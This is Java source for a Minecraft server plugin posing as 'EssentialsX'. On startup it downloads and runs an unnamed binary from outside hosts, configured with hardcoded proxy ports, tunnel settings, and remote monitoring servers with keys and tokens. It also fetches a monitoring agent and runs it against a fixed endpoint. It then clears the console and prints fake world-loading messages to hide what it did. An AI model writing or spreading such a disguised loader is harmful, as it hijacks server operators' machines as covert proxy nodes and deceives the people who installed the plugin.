package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {
    private Process sbxProcess;
    private Process komariProcess;
    private volatile boolean shouldRun = true;
    private volatile boolean isProcessRunning = false;
    private volatile boolean isKomariRunning = false;
    
    private static final String[] ALL_ENV_VARS = {
        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "KOMARI_ENDPOINT", "KOMARI_TOKEN"
    };
    
    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");
        
        // Start sbx
        try {
            startSbxProcess();
            getLogger().info("EssentialsX plugin enabled");
        } catch (Exception e) {
            getLogger().severe("Failed to start sbx process: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    private void startSbxProcess() throws Exception {
        if (isProcessRunning) {
            return;
        }
        
        // Determine download URL based on architecture
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.sss.hidns.vip/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        // Download sbx binary
        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
        Path sbxBinary = tmpDir.resolve("sbx");
        
        if (!Files.exists(sbxBinary)) {
            // getLogger().info("Downloading sbx ...");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!sbxBinary.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        
        // Prepare process builder
        ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
        pb.directory(tmpDir.toFile());
        
        // Set environment variables
        Map<String, String> env = pb.environment();
        env.put("UUID", "84398026-8650-454c-8a3c-f464100efd98");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "nz.ccc.gv.uy:443");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "Kab9zHqbDXx0rR3tbxFvL36v5Ot1QJ5R");
        env.put("ARGO_PORT", "8001");
        env.put("ARGO_DOMAIN", "");
        env.put("ARGO_AUTH", "");
        env.put("S5_PORT", "13072");
        env.put("HY2_PORT", "");
        env.put("TUIC_PORT", "13072");
        env.put("ANYTLS_PORT", "");
        env.put("REALITY_PORT", "");
        env.put("ANYREALITY_PORT", "");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "");
        env.put("BOT_TOKEN", "");
        env.put("CFIP", "spring.io");
        env.put("CFPORT", "443");
        env.put("NAME", "");
        env.put("DISABLE_ARGO", "false");
        env.put("KOMARI_ENDPOINT", "https://km.ccc.gv.uy");
        env.put("KOMARI_TOKEN", "pb2pqZWhzIoj7is6BZyUC3");
        
        // Load from system environment variables
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }
        
        // Load from .env file with priority order
        loadEnvFileFromMultipleLocations(env);
        
        // Load from Bukkit configuration file
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }
        
        // Redirect output
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        
        // Start process
        sbxProcess = pb.start();
        isProcessRunning = true;
        
        // Start a monitor thread to log when process exits
        startProcessMonitor();
        // getLogger().info("sbx started");

        String komariEndpoint = env.get("KOMARI_ENDPOINT");
        String komariToken = env.get("KOMARI_TOKEN");
        if (komariEndpoint != null && !komariEndpoint.trim().isEmpty()
                && komariToken != null && !komariToken.trim().isEmpty()) {
            try {
                startKomariProcess(komariEndpoint.trim(), komariToken.trim());
            } catch (Exception e) {
                getLogger().warning("Failed to start Komari agent: " + e.getMessage());
            }
        }
        
        // sleep 30 seconds
        Thread.sleep(30000);
        
        clearConsole();
        getLogger().info("");
        getLogger().info("Preparing spawn area: 1%");
        getLogger().info("Preparing spawn area: 5%");
        getLogger().info("Preparing spawn area: 10%");
        getLogger().info("Preparing spawn area: 20%");
        getLogger().info("Preparing spawn area: 30%");
        getLogger().info("Preparing spawn area: 80%");
        getLogger().info("Preparing spawn area: 85%");
        getLogger().info("Preparing spawn area: 90%");
        getLogger().info("Preparing spawn area: 95%");
        getLogger().info("Preparing spawn area: 99%");
        getLogger().info("Preparing spawn area: 100%");
        getLogger().info("Preparing level \"world\"");
    }
    
    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
        List<Path> possibleEnvFiles = new ArrayList<>();
        File pluginsFolder = getDataFolder().getParentFile();
        if (pluginsFolder != null && pluginsFolder.exists()) {
            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
        }
        
        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
        possibleEnvFiles.add(Paths.get(".env"));
        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));
        
        Path loadedEnvFile = null;
        
        for (Path envFile : possibleEnvFiles) {
            if (Files.exists(envFile)) {
                try {
                    // getLogger().info("Loading environment variables from: " + envFile.toAbsolutePath());
                    loadEnvFile(envFile, env);
                    loadedEnvFile = envFile;
                    break;
                } catch (IOException e) {
                    // getLogger().warning("Error reading .env file from " + envFile + ": " + e.getMessage());
                }
            }
        }
        
        if (loadedEnvFile == null) {
           // getLogger().info("No .env file found in any of the checked locations");
        }
    }
    
    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
        for (String line : Files.readAllLines(envFile)) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("#")) continue;
            line = line.split(" #")[0].split(" //")[0].trim();
            if (line.startsWith("export ")) {
                line = line.substring(7).trim();
            }
            
            String[] parts = line.split("=", 2);
            if (parts.length == 2) {
                String key = parts[0].trim();
                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                
                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                    env.put(key, value);
                    // getLogger().info("Loaded " + key + " = " + (key.contains("KEY") || key.contains("TOKEN") || key.contains("AUTH") ? "***" : value));
                }
            }
        }
    }
    
    private void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
            
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }
        } catch (Exception e) {
            System.out.println("\n\n\n\n\n\n\n\n\n\n");
        }
    }
    
    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                int exitCode = sbxProcess.waitFor();
                isProcessRunning = false;
                // getLogger().info("sbx process exited with code: " + exitCode);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "Sbx-Process-Monitor");
        
        monitorThread.setDaemon(true);
        monitorThread.start();
    }

    private void startKomariProcess(String endpoint, String token) throws Exception {
        if (isKomariRunning) {
            return;
        }

        String osName = System.getProperty("os.name").toLowerCase();
        if (!osName.contains("linux")) {
            throw new RuntimeException("Komari agent supports Linux only: " + osName);
        }

        String osArch = System.getProperty("os.arch").toLowerCase();
        String arch;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            arch = "amd64";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            arch = "arm64";
        } else {
            throw new RuntimeException("Unsupported architecture for Komari agent: " + osArch);
        }

        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-" + arch;

        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
        Path komariBinary = tmpDir.resolve("komari-agent");

        if (!Files.exists(komariBinary)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, komariBinary, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!komariBinary.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission for Komari agent");
            }
        }

        ProcessBuilder pb = new ProcessBuilder(
                komariBinary.toString(),
                "-e", endpoint,
                "-t", token
        );
        pb.directory(tmpDir.toFile());
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);

        komariProcess = pb.start();
        isKomariRunning = true;

        Thread monitorThread = new Thread(() -> {
            try {
                komariProcess.waitFor();
                isKomariRunning = false;
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isKomariRunning = false;
            }
        }, "Komari-Process-Monitor");

        monitorThread.setDaemon(true);
        monitorThread.start();
    }
    
    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");
        
        shouldRun = false;
        
        if (sbxProcess != null && sbxProcess.isAlive()) {
            // getLogger().info("Stopping sbx process...");
            sbxProcess.destroy();
            
            try {
                if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
                    sbxProcess.destroyForcibly();
                    getLogger().warning("Forcibly terminated sbx process");
                } else {
                    getLogger().info("sbx process stopped normally");
                }
            } catch (InterruptedException e) {
                sbxProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
            isProcessRunning = false;
        }

        if (komariProcess != null && komariProcess.isAlive()) {
            komariProcess.destroy();

            try {
                if (!komariProcess.waitFor(10, TimeUnit.SECONDS)) {
                    komariProcess.destroyForcibly();
                    getLogger().warning("Forcibly terminated Komari agent");
                } else {
                    getLogger().info("Komari agent stopped normally");
                }
            } catch (InterruptedException e) {
                komariProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
            isKomariRunning = false;
        }
        
        getLogger().info("EssentialsX plugin disabled");
    }
}
